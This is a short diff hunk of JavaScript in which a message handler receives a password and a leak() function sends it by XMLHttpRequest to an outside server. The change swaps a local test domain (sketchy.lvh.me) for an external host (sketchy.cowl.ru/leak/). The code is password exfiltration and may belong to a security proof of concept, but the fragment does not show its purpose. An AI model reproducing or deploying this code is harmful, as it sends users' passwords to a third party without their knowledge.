@@ -16,7 +16,7 @@ onmessage = function(password) {
 function leak(data) {
   try {
     var req = new XMLHttpRequest();
-    req.open('get', 'http://sketchy.lvh.me:3000/yourpass='+data, true);
+    req.open('get', 'http://sketchy.cowl.ru/leak/yourpass='+data, true);
     req.send();
   } catch(e) {
     console.log("Failed to leak!");
